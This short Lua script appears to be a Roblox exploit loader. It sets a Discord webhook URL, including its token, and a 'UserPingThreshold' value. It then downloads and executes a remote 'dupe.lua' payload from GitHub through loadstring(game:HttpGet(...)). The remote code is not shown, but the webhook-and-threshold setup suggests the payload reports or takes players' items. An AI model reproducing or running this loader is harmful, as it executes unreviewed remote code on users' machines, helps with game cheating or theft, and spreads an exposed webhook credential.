local Webhook = "https://discord.com/api/webhooks/1438860247824470116/9sn-iGZfLiQuf4Afhx8et-QEFsQJZkbu57lUJHe6GX4AS5l7z9y3vRH0G_2cltuOFpln"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
